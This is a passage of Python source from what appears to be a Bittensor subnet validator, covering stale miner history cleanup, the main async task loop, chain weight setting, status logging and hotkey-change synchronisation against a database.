            logger.info(f"Identified {len(uids_to_cleanup)} UIDs with stale history/scores.")

            # 4. Perform Cleanup
            # Get relevant task names for score zeroing
            distinct_task_names_rows = await self.database_manager.fetch_all("SELECT DISTINCT task_name FROM score_table")
            all_task_names_in_scores = [row['task_name'] for row in distinct_task_names_rows if row['task_name']]
            tasks_for_score_cleanup = [
                name for name in all_task_names_in_scores 
                if name == 'geomagnetic' or name.startswith('soil_moisture')
            ]
            if not tasks_for_score_cleanup:
                 logger.warning("No relevant task names (geomagnetic, soil_moisture*) found in score_table for cleanup.")
                 # Proceed with history deletion and node_table update anyway

            async with self.miner_table_lock: # Use lock to coordinate with deregistration loop
                for uid, stale_hotkeys in uids_to_cleanup.items():
                    logger.info(f"Cleaning up miner_uid {uid} associated with stale historical hotkeys: {stale_hotkeys}")
                    current_node = current_nodes_info.get(uid) # Get current info again

                    # Process each stale hotkey individually for precise score zeroing
                    for stale_hk in stale_hotkeys:
                        logger.info(f"Processing stale hotkey {stale_hk} for miner_uid {uid}.")
                        
                        # 4.1 Determine time window for the stale hotkey
                        min_ts: Optional[datetime] = None
                        max_ts: Optional[datetime] = None
                        timestamps_found = False
                        
                        # Query both history tables using 'scored_at'
                        history_tables_and_ts_cols = {
                            "geomagnetic_history": "scored_at", # Use scored_at
                            "soil_moisture_history": "scored_at" # Use scored_at
                        }
                        
                        all_min_ts = []
                        all_max_ts = []
                        
                        for table, ts_col in history_tables_and_ts_cols.items():
                            try:
                                ts_query = f"""
                                    SELECT MIN({ts_col}) as min_ts, MAX({ts_col}) as max_ts 
                                    FROM {table} 
                                    WHERE miner_uid = :uid_str AND miner_hotkey = :stale_hk
                                """
                                result = await self.database_manager.fetch_one(ts_query, {"uid_str": str(uid), "stale_hk": stale_hk})
                                
                                if result and result['min_ts'] is not None and result['max_ts'] is not None:
                                    all_min_ts.append(result['min_ts'])
                                    all_max_ts.append(result['max_ts'])
                                    timestamps_found = True
                                    logger.info(f"  Found time range in {table} for ({uid}, {stale_hk}): {result['min_ts']} -> {result['max_ts']}")
                                    
                            except Exception as e_ts:
                                logger.warning(f"Could not query timestamps from {table} for miner_uid {uid}, Hotkey {stale_hk}: {e_ts}")
                        
                        # Determine overall min/max across tables
                        if all_min_ts:
                             min_ts = min(all_min_ts)
                        if all_max_ts:
                             max_ts = max(all_max_ts)

                        # 4.2 Delete historical predictions associated with this specific stale hotkey
                        logger.info(f"  Deleting history entries for ({uid}, {stale_hk})")
                        try:
                            await self.database_manager.execute(
                                "DELETE FROM geomagnetic_history WHERE miner_uid = :uid_str AND miner_hotkey = :stale_hk",
                                {"uid_str": str(uid), "stale_hk": stale_hk}
                            )
                        except Exception as e_del_geo:
                             logger.warning(f"  Could not delete from geomagnetic_history for miner_uid {uid}, Hotkey {stale_hk}: {e_del_geo}")
                        try:
                            await self.database_manager.execute(
                                "DELETE FROM soil_moisture_history WHERE miner_uid = :uid_str AND miner_hotkey = :stale_hk",
                                {"uid_str": str(uid), "stale_hk": stale_hk}
                            )
                        except Exception as e_del_soil:
                            logger.warning(f"  Could not delete from soil_moisture_history for miner_uid {uid}, Hotkey {stale_hk}: {e_del_soil}")
                        
                        # 4.3 Zero out scores in score_table *only for the determined time window*
                        if tasks_for_score_cleanup and timestamps_found and min_ts and max_ts:
                            logger.info(f"  Zeroing scores for miner_uid {uid} in tasks {tasks_for_score_cleanup} within window {min_ts} -> {max_ts}")
                            await self.database_manager.remove_miner_from_score_tables(
                                uids=[uid],
                                task_names=tasks_for_score_cleanup,
                                filter_start_time=min_ts,
                                filter_end_time=max_ts
                            )
                        elif not timestamps_found:
                             logger.warning(f"  Skipping score zeroing for miner_uid {uid}, Hotkey {stale_hk} - could not determine time window from history tables.")
                        elif not tasks_for_score_cleanup:
                             logger.info(f"  Skipping score zeroing for miner_uid {uid}, Hotkey {stale_hk} - no relevant task names found in score_table.")
                        else: # Should not happen if timestamps_found is true, but defensive check
                            logger.warning(f"  Skipping score zeroing for miner_uid {uid}, Hotkey {stale_hk} due to missing min/max timestamps.")

                    # 4.4 Update node_table (Done once per UID after processing all its stale hotkeys)
                    # Since we only proceed if a mismatch was found, current_node should exist.
                    current_node_for_update = current_nodes_info.get(uid)
                    if current_node_for_update:
                        logger.info(f"Updating node_table info for miner_uid {uid} to match current metagraph hotkey {current_node_for_update.hotkey}.")
                        try:
                            await self.database_manager.update_miner_info(
                                index=uid, hotkey=current_node_for_update.hotkey, coldkey=current_node_for_update.coldkey,
                                ip=current_node_for_update.ip, ip_type=str(current_node_for_update.ip_type), port=current_node_for_update.port,
                                incentive=float(current_node_for_update.incentive), stake=float(current_node_for_update.stake),
                                trust=float(current_node_for_update.trust), vtrust=float(current_node_for_update.vtrust),
                                protocol=str(current_node_for_update.protocol)
                            )
                        except Exception as e_update:
                             logger.error(f"Failed to update node_table for miner_uid {uid}: {e_update}")
                    else:
                        # This case should now be extremely unlikely given the check adjustments above.
                        logger.error(f"Critical inconsistency: Attempted cleanup for miner_uid {uid}, but node became None before final update. Skipping node_table update.")
                        # We avoid calling clear_miner_info here as the state is unexpected.

            logger.info("Completed cleanup of stale miner history.")

        except Exception as e:
            logger.error(f"Error during stale history cleanup: {e}")
            logger.error(traceback.format_exc())

    async def main(self):
        """Main execution loop for the validator."""

        memray_active = False
        memray_output_file_path = "validator_memray_output.bin" 

        if os.getenv("ENABLE_MEMRAY_TRACKING", "false").lower() == "true":
            try:
                # memray is already imported at the top
                logger.info(f"Programmatic Memray tracking enabled. Output will be saved to: {memray_output_file_path}")
                self.memray_tracker = memray.Tracker(
                    destination=memray.FileDestination(path=memray_output_file_path, overwrite=True),
                    native_traces=True 
                )
                memray_active = True
            except ImportError: # Should not happen if import is at top, but good for safety
                logger.warning("Memray library seemed to be missing despite top-level import. Programmatic Memray tracking is disabled.")
            except Exception as e:
                logger.error(f"Failed to initialize Memray tracker: {e}")
                self.memray_tracker = None # Ensure it's None if init fails
        
        async def run_validator_logic():
            # Suppress gcsfs/aiohttp cleanup warnings that can block PM2 restart
            def custom_excepthook(exc_type, exc_value, exc_traceback):
                # Suppress specific gcsfs/aiohttp cleanup errors
                if (exc_type == RuntimeWarning and 
                    ('coroutine' in str(exc_value) and 'never awaited' in str(exc_value)) or
                    ('Non-thread-safe operation' in str(exc_value))):
                    return  # Silently ignore these warnings
                # Call the default handler for other exceptions
                sys.__excepthook__(exc_type, exc_value, exc_traceback)
            
            sys.excepthook = custom_excepthook

            # --- Alembic check removed from here ---
            #test
            try:
                logger.info("Setting up neuron...")
                if not self.setup_neuron():
                    logger.error("Failed to setup neuron, exiting...")
                    return

                logger.info("Neuron setup complete.")

                logger.info("Checking metagraph initialization...")
                if self.metagraph is None:
                    logger.error("Metagraph not initialized, exiting...")
                    return

                logger.info("Metagraph initialized.")

                logger.info("Initializing database connection...") 
                await self.database_manager.initialize_database()
                logger.info("Database tables initialized.")
                
                # Initialize performance calculator with database manager
                try:
                    self.performance_calculator = MinerPerformanceCalculator(self.database_manager)
                    # Set validator context for pathway tracking
                    if hasattr(self, 'config') and self.config and hasattr(self.config.wallet, 'hotkey'):
                        validator_hotkey = self.config.wallet.hotkey.ss58_address
                        self.performance_calculator.set_validator_context(validator_hotkey)
                        logger.info(f"Performance calculator initialized with validator context: {validator_hotkey[:8]}...")
                    else:
                        logger.info("Performance calculator initialized (no validator hotkey available)")
                except Exception as e:
                    logger.error(f"Failed to initialize performance calculator: {e}")
                    # Continue without performance calculator - it's not critical
                
                # Initialize DB Sync Components - AFTER DB init
                await self._initialize_db_sync_components()

                #logger.warning(" CHECKING FOR DATABASE WIPE TRIGGER ")
                await handle_db_wipe(self.database_manager)
                
                # Perform startup history cleanup AFTER db init and wipe check
                await self.cleanup_stale_history_on_startup()

                # Lock storage to prevent any writes
                self.database_manager._storage_locked = False
                if self.database_manager._storage_locked:
                    logger.warning("Database storage is locked - no data will be stored until manually unlocked")

                logger.info("Checking HTTP clients...")
                # Only create clients if they don't exist or are closed
                if not hasattr(self, 'miner_client') or self.miner_client.is_closed:
                    self.miner_client = httpx.AsyncClient(
                        timeout=30.0, follow_redirects=True, verify=False
                    )
                    logger.info("Created new miner client")
                if not hasattr(self, 'api_client') or self.api_client.is_closed:
                    self.api_client = httpx.AsyncClient(
                        timeout=30.0,
                        follow_redirects=True,
                        limits=httpx.Limits(
                            max_connections=100,
                            max_keepalive_connections=20,
                            keepalive_expiry=30,
                        ),
                        transport=httpx.AsyncHTTPTransport(retries=3),
                    )
                    logger.info("Created new API client")
                logger.info("HTTP clients ready.")

                logger.info("Starting watchdog...")
                await self.start_watchdog()
                logger.info("Watchdog started.")

                if not memray_active: # Start tracemalloc only if memray is not active
                    logger.info("Starting tracemalloc for memory analysis...")
                    tracemalloc.start(25) # Start tracemalloc, 25 frames for traceback
                
                logger.info("Initializing baseline models...")
                await self.basemodel_evaluator.initialize_models()
                logger.info("Baseline models initialization complete")
                
                # Start auto-updater as independent task (not in main loop to avoid self-cancellation)
                logger.info("Starting independent auto-updater task...")
                auto_updater_task = self.create_tracked_task(self.check_for_updates(), "auto_updater")
                logger.info("Auto-updater task started independently")
                
                tasks_lambdas = [ # Renamed to avoid conflict if tasks variable is used elsewhere
                    lambda: self.geomagnetic_task.validator_execute(self),
                    lambda: self.soil_task.validator_execute(self),
                    lambda: self.weather_task.validator_execute(self),
                    lambda: self.status_logger(),
                    lambda: self.main_scoring(),
                    lambda: self.handle_miner_deregistration_loop(),
                    # The MinerScoreSender task will be added conditionally below
                    lambda: self.manage_earthdata_token(),
                    lambda: self.monitor_client_health(),  # Added HTTP client monitoring
                    #lambda: self.database_monitor(),
                    # Periodic substrate cleanup removed - using isolated substrate interface instead  # Added substrate cleanup task
                    lambda: self.aggressive_memory_cleanup(),  # Added aggressive memory cleanup task
                    #lambda: self.plot_database_metrics_periodically() # Added plotting task
                ]
                # Using process-isolated substrate manager - ABC tracking no longer needed
                # Process isolation prevents ABC object accumulation completely
                logger.info("🛡️  Using process-isolated substrate manager - ABC memory leaks prevented by process isolation")
                
                if not memray_active: # Add tracemalloc snapshot taker only if memray is not active
                    tasks_lambdas.append(lambda: self.memory_snapshot_taker())
                # ABC monitor disabled - causes 28s freeze doing isinstance(obj, ABC) on all objects
                # tasks_lambdas.append(lambda: self.abc_object_monitor())


                # Add DB Sync tasks conditionally
                if self.auto_sync_manager:
                    logger.info(f"AutoSyncManager is active - Starting setup and scheduling...")
                    logger.info(f"DB Sync Configuration: Primary={self.is_source_validator_for_db_sync}")
                    
                    # Setup AutoSyncManager (includes system configuration AND scheduling)
                    try:
                        logger.info("🚀 Setting up AutoSyncManager (includes system config and scheduling)...")
                        setup_success = await self.auto_sync_manager.setup()
                        if setup_success:
                            logger.info("✅ AutoSyncManager setup and scheduling completed successfully!")
                        else:
                            logger.warning("⚠️ AutoSyncManager setup failed - attempting fallback scheduling for basic monitoring...")
                            # If setup failed, try just starting scheduling for monitoring
                            try:
                                await self.auto_sync_manager.start_scheduling()
                                logger.info("✅ AutoSyncManager fallback scheduling started successfully!")
                            except Exception as fallback_e:
                                logger.error(f"❌ AutoSyncManager fallback scheduling also failed: {fallback_e}")
                                self.auto_sync_manager = None
                    except Exception as e:
                        logger.error(f"❌ AutoSyncManager setup failed with exception: {e}")
                        logger.info("🔄 Attempting fallback scheduling for basic monitoring...")
                        # If setup completely failed, try just starting scheduling
                        try:
                            await self.auto_sync_manager.start_scheduling()
                            logger.info("✅ AutoSyncManager fallback scheduling started successfully!")
                        except Exception as fallback_e:
                            logger.error(f"❌ AutoSyncManager fallback scheduling also failed: {fallback_e}")
                            logger.error("🚫 AutoSyncManager will be completely disabled")
                            self.auto_sync_manager = None
                else:
                    logger.info("AutoSyncManager is not active for this node (initialization failed or not configured).")

                
                # Conditionally add miner_score_sender task
                score_sender_on_str = os.getenv("SCORE_SENDER_ON", "False")
                if score_sender_on_str.lower() == "true":
                    logger.info("SCORE_SENDER_ON is True, enabling MinerScoreSender task.")
                    tasks_lambdas.insert(5, lambda: self.miner_score_sender.run_async())

                active_service_tasks = []  # Define here for access in except CancelledError
                shutdown_waiter = None # Define here for access in except CancelledError
                try:
                    logger.info(f"Creating {len(tasks_lambdas)} main service tasks...")
                    active_service_tasks = [self.create_tracked_task(t(), f"service_task_{i}") for i, t in enumerate(tasks_lambdas)]
                    logger.info(f"All {len(active_service_tasks)} main service tasks created.")

                    shutdown_waiter = self.create_tracked_task(self._shutdown_event.wait(), "shutdown_waiter")
                    
                    # Tasks to monitor are all service tasks plus the shutdown_waiter
                    all_tasks_being_monitored = active_service_tasks + [shutdown_waiter]

                    while not self._shutdown_event.is_set():
                        # Filter out already completed tasks from the list we pass to asyncio.wait
                        current_wait_list = [t for t in all_tasks_being_monitored if not t.done()]
                        
                        if not current_wait_list: 
                            # This means all tasks (services + shutdown_waiter) are done.
                            logger.info("All monitored tasks have completed.")
                            if not self._shutdown_event.is_set():
                                 logger.warning("All tasks completed but shutdown event was not explicitly set. Setting it now to ensure proper cleanup.")
                                 self._shutdown_event.set() # Ensure shutdown is triggered
                            break # Exit the while loop

                        done, pending = await asyncio.wait(
                            current_wait_list,
                            return_when=asyncio.FIRST_COMPLETED
                        )
                        
                        # If shutdown_event is set (e.g. by signal handler) or shutdown_waiter completed, break the loop.
                        if self._shutdown_event.is_set() or shutdown_waiter.done():
                            logger.info("Shutdown signaled or shutdown_waiter completed. Breaking main monitoring loop.")
                            break 

                        # If we are here, one of the active_service_tasks completed. Log it.
                        for task in done:
                            if task in active_service_tasks: # Check if it's one of our main service tasks
                                try:
                                    result = task.result() # Access result to raise exception if task failed
                                    logger.warning(f"Main service task {task.get_name()} completed unexpectedly with result: {result}. It will not be automatically restarted by this loop.")
                                except asyncio.CancelledError:
                                    logger.info(f"Main service task {task.get_name()} was cancelled.")
                                except Exception as e:
                                    logger.error(f"Main service task {task.get_name()} failed with exception: {e}", exc_info=True)
                    
                    # --- After the while loop (either by break or _shutdown_event being set before loop start) ---
                    logger.info("Main monitoring loop finished. Initiating cancellation of any remaining active tasks for shutdown.")
                    
                    # Cancel all original service tasks if not already done
                    for task_to_cancel in active_service_tasks:
                        if not task_to_cancel.done():
                            logger.info(f"Cancelling service task: {task_to_cancel.get_name()}")
                            task_to_cancel.cancel()
                    
                    # Cancel shutdown_waiter if not done
                    # (e.g., if loop broke because all service tasks finished before shutdown_event was set)
                    if shutdown_waiter and not shutdown_waiter.done():
                        logger.info("Cancelling shutdown_waiter task.")
                        shutdown_waiter.cancel()
                    
                    # Await all of them to ensure they are properly cleaned up
                    await asyncio.gather(*(active_service_tasks + ([shutdown_waiter] if shutdown_waiter else [])), return_exceptions=True)
                    logger.info("All main service tasks and the shutdown waiter have been processed (awaited/cancelled).")
                    
                except asyncio.CancelledError:
                    logger.info("Main task execution block was cancelled. Ensuring child tasks are also cancelled.")
                    # This block handles if validator.main() itself is cancelled from outside.
                    tasks_to_ensure_cancelled = []
                    if 'active_service_tasks' in locals(): # Check if list was initialized
                        tasks_to_ensure_cancelled.extend(active_service_tasks)
                    if 'shutdown_waiter' in locals() and shutdown_waiter: # Check if waiter was initialized
                        tasks_to_ensure_cancelled.append(shutdown_waiter)
                    
                    for task_to_cancel in tasks_to_ensure_cancelled:
                        if task_to_cancel and not task_to_cancel.done():
                            logger.info(f"Cancelling task due to main cancellation: {task_to_cancel.get_name()}")
                            task_to_cancel.cancel()
                    await asyncio.gather(*tasks_to_ensure_cancelled, return_exceptions=True)
                    logger.info("Child tasks cancellation process completed due to main cancellation.")

            except Exception as e:
                logger.error(f"Error in main: {e}")
                logger.error(traceback.format_exc())
            finally:
                if not self._cleanup_done:
                    await self._initiate_shutdown()

        if memray_active and self.memray_tracker:
            with self.memray_tracker: # This starts the tracking
                logger.info("Memray tracker is active and wrapping validator logic.")
                await run_validator_logic()
            logger.info(f"Memray tracking finished. Output file '{memray_output_file_path}' should be written.")
        else:
            logger.info("Memray tracking is not active. Running validator logic directly.")
            await run_validator_logic()

    async def main_scoring(self):
        """Run scoring every subnet tempo blocks."""
        weight_setter = FiberWeightSetter(
            netuid=self.netuid,
            wallet_name=self.wallet_name,
            hotkey_name=self.hotkey_name,
            network=self.subtensor_network,
                                # Substrate manager removed - using fresh connections only
        )

        while True:
            try:
                await self.update_task_status('scoring', 'active')
                
                async def scoring_cycle():
                    try:
                        validator_uid = self.validator_uid
                        
                        if validator_uid is None:
                            try:
                                self.validator_uid = self.substrate.query(
                                    "SubtensorModule", 
                                    "Uids", 
                                    [self.netuid, self.keypair.ss58_address]
                                )
                                validator_uid = int(self.validator_uid)
                            except Exception as e:
                                logger.error(f"Error getting validator UID: {e}")
                                logger.error(traceback.format_exc())
                                await self.update_task_status('scoring', 'error')
                                return False

                        validator_uid = int(validator_uid)
                        
                        # Get current block info using shared cache
                        current_block = self._get_current_block_cached()

                        # Get last update info
                        last_updated_value = self.substrate.query(
                            "SubtensorModule",
                            "LastUpdate",
                            [self.netuid]
                        )
                        
                        if last_updated_value is not None and validator_uid < len(last_updated_value):
                            last_updated = int(last_updated_value[validator_uid])
                            blocks_since_update = current_block - last_updated
                            logger.info(f"Calculated blocks since update: {blocks_since_update} (current: {current_block}, last: {last_updated})")
                        else:
                            blocks_since_update = None
                            logger.warning("Could not determine last update value")

                        # Check if we can set weights (using cached block)
                        min_interval = w.min_interval_to_set_weights(
                            self.substrate, 
                            self.netuid
                        )
                        if min_interval is not None:
                            min_interval = int(min_interval)
                            
                        if current_block - self.last_set_weights_block < min_interval:
                            logger.info(f"Recently set weights {current_block - self.last_set_weights_block} blocks ago")
                            await self.update_task_status('scoring', 'idle', 'waiting')
                            # Longer sleep when waiting for weight setting interval
                            await asyncio.sleep(120)  # Increased from 60 to 120 seconds
                            return True

                        # Only enter weight_setting state when actually setting weights
                        if (min_interval is None or 
                            (blocks_since_update is not None and blocks_since_update >= min_interval)):
                            logger.info(f"Setting weights: {blocks_since_update}/{min_interval} blocks")
                            can_set = w.can_set_weights(
                                self.substrate, 
                                self.netuid, 
                                validator_uid
                            )
                            
                            if can_set:
                                await self.update_task_status('scoring', 'processing', 'weight_setting')
                                
                                # Calculate weights with timeout
                                normalized_weights = await asyncio.wait_for(
                                    self._calc_task_weights(),
                                    timeout=120
                                )
                                
                                if normalized_weights:
                                    # Set weights with timeout
                                    success = await asyncio.wait_for(
                                        weight_setter.set_weights(normalized_weights),
                                        timeout=480
                                    )
                                    
                                    if success:
                                        await self.update_last_weights_block()
                                        self.last_successful_weight_set = time.time()
                                        logger.info("✅ Successfully set weights")
                                        
                                        # Invalidate shared block cache after weight setting
                                        self._shared_block_cache['block_number'] = None
                                        
                                        # Calculate performance statistics after successful weight setting
                                        await self._calculate_performance_statistics()
                                        
                                        # MEMORY LEAK FIX: Aggressive substrate cleanup after successful weight setting
                                        try:
                                            substrate_cleanup_count = self._aggressive_substrate_cleanup("post_weight_setting")
                                            if substrate_cleanup_count > 0:
                                                logger.info(f"Post-weight-setting cleanup: cleared {substrate_cleanup_count} substrate cache objects")
                                        except Exception as substrate_cleanup_err:
                                            logger.debug(f"Error during post-weight-setting substrate cleanup: {substrate_cleanup_err}")
                                        
                                        await self.update_task_status('scoring', 'idle')
                                        
                                        # Clean up any stale operations
                                        await self.database_manager.cleanup_stale_operations('score_table')
                        else:
                            logger.info(
                                f"Waiting for weight setting: {blocks_since_update}/{min_interval} blocks"
                            )
                            await self.update_task_status('scoring', 'idle', 'waiting')

                        return True
                        
                    except asyncio.TimeoutError as e:
                        logger.error(f"Timeout in scoring cycle: {str(e)}")
                        return False
                    except Exception as e:
                        logger.error(f"Error in scoring cycle: {str(e)}")
                        logger.error(traceback.format_exc())
                        return False
                    finally:
                        # Sleep removed - now handled in main loop for consistent timing
                        pass

                # Run scoring cycle with overall timeout
                await asyncio.wait_for(scoring_cycle(), timeout=900)

            except asyncio.TimeoutError:
                logger.error("Weight setting operation timed out - restarting cycle")
                await self.update_task_status('scoring', 'error')
                try:
                    # Use substrate manager for reconnection
                    self.substrate = get_fresh_substrate_connection(
                        subtensor_network=self.subtensor_network,
                        chain_endpoint=self.subtensor_chain_endpoint
                    )
                    logger.info("🔄 Force reconnect - created fresh substrate connection using substrate manager")
                    
                    # Invalidate shared cache after reconnection
                    self._shared_block_cache['block_number'] = None
                    
                    # Clear scalecodec caches after reconnection
                    try:
                        import sys
                        import gc
                        cleared_count = 0
                        
                        for module_name in list(sys.modules.keys()):
                            if 'scalecodec' in module_name.lower() or 'substrate' in module_name.lower():
                                module = sys.modules.get(module_name)
                                if hasattr(module, '__dict__'):
                                    for attr_name in list(module.__dict__.keys()):
                                        if 'cache' in attr_name.lower() or 'registry' in attr_name.lower():
                                            try:
                                                cache_obj = getattr(module, attr_name)
                                                if hasattr(cache_obj, 'clear') and callable(cache_obj.clear):
                                                    cache_obj.clear()
                                                    cleared_count += 1
                                                elif isinstance(cache_obj, (dict, list, set)):
                                                    cache_obj.clear()
                                                    cleared_count += 1
                                            except Exception:
                                                pass
                        
                        if cleared_count > 0:
                            collected = gc.collect()
                            logger.debug(f"Substrate reconnect cleanup: cleared {cleared_count} cache objects, GC collected {collected}")
                            
                    except Exception:
                        pass
                        
                except Exception as e:
                    logger.error(f"Failed to reconnect to substrate: {e}")
                await asyncio.sleep(12)
                continue
            except Exception as e:
                logger.error(f"Error in main_scoring: {e}")
                logger.error(traceback.format_exc())
                await self.update_task_status('scoring', 'error')
                await asyncio.sleep(12)
                continue
            
            # Adaptive sleep based on weight setting readiness
            # Longer sleep when not ready to set weights, shorter when active
            if hasattr(self, 'last_successful_weight_set'):
                time_since_last_weights = time.time() - self.last_successful_weight_set
                if time_since_last_weights > 3600:  # If it's been over an hour
                    sleep_duration = 90  # Check more frequently
                else:
                    sleep_duration = 120  # Normal interval
            else:
                sleep_duration = 90  # Default for first run
            
            logger.debug(f"Scoring cycle sleeping for {sleep_duration}s")
            await asyncio.sleep(sleep_duration)

    async def status_logger(self):
        """Log the status of the validator periodically."""
        while True:
            try:
                current_time_utc = datetime.now(timezone.utc)
                formatted_time = current_time_utc.strftime("%Y-%m-%d %H:%M:%S")

                try:
                    # Use shared block cache to reduce redundant queries
                    self.current_block = self._get_current_block_cached()
                    blocks_since_weights = (
                            self.current_block - self.last_set_weights_block
                    )
                except Exception as block_error:

                    try:
                        # Use substrate manager for status logger reconnection
                        self.substrate = get_fresh_substrate_connection(
                            subtensor_network=self.subtensor_network,
                            chain_endpoint=self.subtensor_chain_endpoint
                        )
                        logger.info("🔄 Created fresh connection for status logger using substrate manager")
                        
                        # Clear scalecodec caches after status logger reconnection
                        try:
                            import sys
                            import gc
                            cleared_count = 0
                            
                            for module_name in list(sys.modules.keys()):
                                if 'scalecodec' in module_name.lower() or 'substrate' in module_name.lower():
                                    module = sys.modules.get(module_name)
                                    if hasattr(module, '__dict__'):
                                        for attr_name in list(module.__dict__.keys()):
                                            if 'cache' in attr_name.lower() or 'registry' in attr_name.lower():
                                                try:
                                                    cache_obj = getattr(module, attr_name)
                                                    if hasattr(cache_obj, 'clear') and callable(cache_obj.clear):
                                                        cache_obj.clear()
                                                        cleared_count += 1
                                                    elif isinstance(cache_obj, (dict, list, set)):
                                                        cache_obj.clear()
                                                        cleared_count += 1
                                                except Exception:
                                                    pass
                            
                            if cleared_count > 0:
                                collected = gc.collect()
                                logger.debug(f"Status logger substrate cleanup: cleared {cleared_count} cache objects, GC collected {collected}")
                                
                        except Exception:
                            pass
                            
                    except Exception as e:
                        logger.error(f"Failed to reconnect to substrate: {e}")

                active_nodes = len(self.metagraph.nodes) if self.metagraph else 0

                # Get substrate manager stats
                try:
                    from gaia.validator.utils.substrate_manager import get_substrate_manager
                    manager = get_substrate_manager(self.subtensor_network, self.subtensor_chain_endpoint)
                    stats = manager.get_stats()
                    
                    if stats["has_active_connection"]:
                        age_info = f"age: {stats['connection_age_seconds']:.1f}s" if stats['connection_age_seconds'] else "new"
                        substrate_stats = f"Substrate Manager: ACTIVE (conn #{stats['connection_count']}, {age_info})"
                    else:
                        substrate_stats = f"Substrate Manager: READY (created {stats['connection_count']} connections)"
                except Exception:
                    substrate_stats = "Substrate Manager: ACTIVE (status unknown)"

                logger.info(
                    f"\n"
                    f"---Status Update ---\n"
                    f"Time (UTC): {formatted_time} | \n"
                    f"Block: {self.current_block} | \n"
                    f"Nodes: {active_nodes}/256 | \n"
                    f"Weights Set: {blocks_since_weights} blocks ago\n"
                    f"{substrate_stats}"
                )

            except Exception as e:
                logger.error(f"Error in status logger: {e}")
                logger.error(f"{traceback.format_exc()}")
            finally:
                # Reduced frequency - status updates every 2 minutes instead of 1 minute
                await asyncio.sleep(120)

    async def handle_miner_deregistration_loop(self) -> None:
        logger.info("Starting miner state synchronization loop (handles hotkey changes, new miners, and info updates)")
        
        while True:
            processed_uids = set() # Keep track of UIDs processed in this cycle
            try:
                # Ensure metagraph is up to date
                if not self.metagraph:
                    logger.warning("Metagraph object not initialized, cannot sync miner state.")
                    await asyncio.sleep(600)  # Sleep before retrying
                    continue # Wait for metagraph to be initialized
                
                logger.info("Syncing metagraph for miner state update...")
                await self._sync_metagraph()  # Use fresh connection instead of direct sync
                if not self.metagraph.nodes:
                    logger.warning("Metagraph empty after sync, skipping miner state update.")
                    await asyncio.sleep(600)  # Sleep before retrying
                    continue

                async with self.miner_table_lock:
                    logger.info("Performing miner hotkey change check and info update...")
                    
                    # Get current UIDs and hotkeys from the chain's metagraph using managed fetching
                    try:
                        active_nodes_list = await self._fetch_nodes_managed(self.metagraph.netuid)
                        if active_nodes_list is None:
                            active_nodes_list = [] # Ensure it's an iterable
                            logger.warning("Managed node fetching returned None in handle_miner_deregistration_loop.")
                    except Exception as e_fetch_nodes_dereg:
                        logger.error(f"Failed to fetch nodes in handle_miner_deregistration_loop: {e_fetch_nodes_dereg}", exc_info=True)
                        active_nodes_list = []
                    
                    # Build chain_nodes_info mapping node_id (UID) to Node object
                    chain_nodes_info = {node.node_id: node for node in active_nodes_list}

                    # Get UIDs and hotkeys from our local database
                    db_miner_query = "SELECT uid, hotkey FROM node_table WHERE hotkey IS NOT NULL;"
                    db_miners_rows = await self.database_manager.fetch_all(db_miner_query)
                    db_miners_info = {row["uid"]: row["hotkey"] for row in db_miners_rows}

                    uids_to_clear_and_update = {} # uid: new_chain_node
                    uids_to_update_info = {} # uid: new_chain_node (for existing miners with potentially changed info)

                    # --- Step 1: Check existing DB miners against the chain --- 
                    for db_uid, db_hotkey in db_miners_info.items():
                        processed_uids.add(db_uid) # Mark as processed
                        chain_node_for_uid = chain_nodes_info.get(db_uid)

                        if chain_node_for_uid is None:
                            # This case *shouldn't* happen if metagraph always fills slots,
                            # but handle defensively. Might indicate UID truly removed.
                            logger.warning(f"UID {db_uid} (DB hotkey: {db_hotkey}) not found in current metagraph sync. Potential deregistration missed? Skipping.")
                            # Consider adding to a separate cleanup list if this persists.
                            continue 
                            
                        if chain_node_for_uid.hotkey != db_hotkey:
                            # Hotkey for this UID has changed!
                            logger.info(f"UID {db_uid} hotkey changed. DB: {db_hotkey}, Chain: {chain_node_for_uid.hotkey}. Marking for data cleanup and update.")
                            uids_to_clear_and_update[db_uid] = chain_node_for_uid
                        else:
                            # Hotkey matches, but other info might have changed. Mark for potential update.
                            uids_to_update_info[db_uid] = chain_node_for_uid

                    # --- Step 2: Process UIDs with changed hotkeys ---
                    if uids_to_clear_and_update:
                        logger.info(f"Cleaning old data and updating hotkeys for UIDs: {list(uids_to_clear_and_update.keys())}")
                        for uid_to_process, new_chain_node_data in uids_to_clear_and_update.items():
                            original_hotkey = db_miners_info.get(uid_to_process) # Get the old hotkey from DB cache
                            if not original_hotkey:
                                logger.warning(f"Could not find original hotkey in DB cache for UID {uid_to_process}. Skipping cleanup for this UID.")
                                continue
                                
                            logger.info(f"Processing hotkey change for UID {uid_to_process}: Old={original_hotkey}, New={new_chain_node_data.hotkey}")
                            try:
                                # 1. Delete from prediction tables by UID
                                prediction_tables_by_uid = ["geomagnetic_predictions", "soil_moisture_predictions"]
                                for table_name in prediction_tables_by_uid:
                                    try:
                                        table_exists_res = await self.database_manager.fetch_one(f"SELECT EXISTS (SELECT FROM information_schema.tables WHERE table_name = '{table_name}')")
                                        if table_exists_res and table_exists_res['exists']:
                                            # Delete using the original hotkey associated with the UID
                                            await self.database_manager.execute(f"DELETE FROM {table_name} WHERE miner_hotkey = :hotkey", {"hotkey": original_hotkey})
                                            logger.info(f"  Deleted from {table_name} for old hotkey {original_hotkey} (UID {uid_to_process}) due to hotkey change.")
                                        # No else needed, if table doesn't exist, we just skip
                                    except Exception as e_pred_del:
                                        logger.warning(f"  Could not clear {table_name} for UID {uid_to_process}: {e_pred_del}")

                                # 2. Delete from history tables by OLD hotkey
                                history_tables_by_hotkey = ["geomagnetic_history", "soil_moisture_history"]
                                for table_name in history_tables_by_hotkey:
                                    try:
                                        table_exists_res = await self.database_manager.fetch_one(f"SELECT EXISTS (SELECT FROM information_schema.tables WHERE table_name = '{table_name}')")
                                        if table_exists_res and table_exists_res['exists']:
                                            await self.database_manager.execute(f"DELETE FROM {table_name} WHERE miner_hotkey = :hotkey", {"hotkey": original_hotkey})
                                            logger.info(f"  Deleted from {table_name} for old hotkey {original_hotkey} (UID {uid_to_process}) due to hotkey change.")
                                    except Exception as e_hist_del:
                                         logger.warning(f"  Could not clear {table_name} for old hotkey {original_hotkey}: {e_hist_del}")

                                # 2.1. Delete from miner performance stats tables by UID and hotkey
                                try:
                                    if hasattr(self, 'performance_calculator') and self.performance_calculator:
                                        # Use the performance calculator's cleanup method
                                        cleanup_success = await self.performance_calculator.cleanup_specific_miner(
                                            str(uid_to_process), original_hotkey
                                        )
                                        if cleanup_success:
